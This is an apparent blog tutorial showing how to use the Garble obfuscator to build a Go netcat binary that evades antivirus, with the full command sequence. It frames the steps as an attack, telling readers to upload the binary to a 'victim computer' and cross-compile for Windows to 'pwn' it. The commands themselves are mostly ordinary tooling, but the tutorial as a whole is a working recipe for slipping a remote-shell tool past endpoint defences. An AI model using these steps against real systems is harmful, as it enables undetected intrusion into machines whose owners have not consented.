<h2>AV Evasion with Garble</h2>
<p>
<a href="https://github.com/burrowers/garble">Garble</a> is a tool used to obfuscate Go.
This is an important thing to do when AntiVirus (AV) is actively monitoring an endpoint you 
are trying to compromise. Many common bits of shellcode and the tools used to create them
are noticed and removed by AV immediately upon entering the computer. If you haven't experienced
this, try to install 
<a href="https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/">Mestaploit</a> 
on a Windows machine with Defender enabled. An easy way to catch a shell and evade AV is to 
just Garble it. Garble is a tool that builds obfuscated binaries of applications written in 
golang. Because of its popularity, many common tools not originally created in go have been 
rewritten in golang, so finding your tool of choice will hopefully not be difficult.
Done properly, you will get a 0% on VirusTotal every time.
<br><br>
The first step is to install golang and make sure it works:
</p>
<blockquote>
<pre>
<code>
$   sudo apt install golang -y
$   go version
go version go1.18.5 linux/amd64
$   command -v go
/usr/bin/go
</blockquote>
</pre>
</code>
<p>
We can now install garble from CLI instead of pulling the code from a repo: 
</p>
<blockquote>
<pre>
<code>
$   go install mvdan.cc/garble@latest
$   cd ~/go/bin ; ls
garble
</blockquote>
</pre>
</code>
<p>
For this test, an implementation of netcat written in golang will be used. We acquire that here:
</p>
<blockquote>
<pre>
<code>
$   git clone https://github.com/vfedoroff/go-netcat.git
$   cd go-netcat
$   ls
LICENSE main.go README.md
</blockquote>
</pre>
</code>
<p>
Before running garble, an environment variable needs to be set. If your path is different
--you know who you are-- you will need to alter the path shown below to the <code>main.go</code>
source code depending on where the repo was cloned:
</p>
<blockquote>
<pre>
<code>
$   export GOGARBLE=/home/kali/go-netcat/main.go
</blockquote>
</pre>
</code>
<p>
Now garble is ready to build an obfuscated binary version of our go version of netcat (gocat?).
Make sure you are in the directory with the source code and that you gave the full path to the
environment variable:
</p>
<blockquote>
<pre>
<code>
$   cd go-netcat
$   ~/go/bin/garble -seed=random build main.go
</blockquote>
</pre>
</code>
<p>
There is no output on this tool as of my writing this, so the CLI will appear to hang
while the binary is built. Trust the process ;) You will soon have a new file in your 
source directory with the same name as your selected file but lacking the <code>.go</code> 
extension. This is your obfuscated binary:
</p>
<blockquote>
<pre>
<code>
$   file main
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, stripped

$   ./main --help
Usage of ./main:
    -l  Used to specify that netcat should listen for an incoming connection
    rather than initiate a connection to a remote host.
    -p  string  Specifies the source port that netcat should use, subject to
    privilege restrictions and availablility. 
    -u  Use UDP instead of the default option of TCP.
</blockquote>
</pre>
</code>
<p>
Now upload <code>main</code> to the victim computer that is running AV and you should 
evade detection. <br><br> If you ever need your obfuscated binary to have an entirely
different checksum you can just rerun the build command <code>~/go/bin/garble -seed=random
build [file]</code> and you will get a shiny new binary. 
</p>
<h3>Crafting Payloads</h3>
<p>
Building for different architectures is possible provided you set two other environment
variables: "GOOS" and "GOARCH":
</p>
<blockquote>
<pre>
<code>
$   GOOS=windows
$   GOARCH=amd64
</blockquote>
</pre>
</code>
<p>
The above will generate a PE32+ executable so you can pwn windows :)
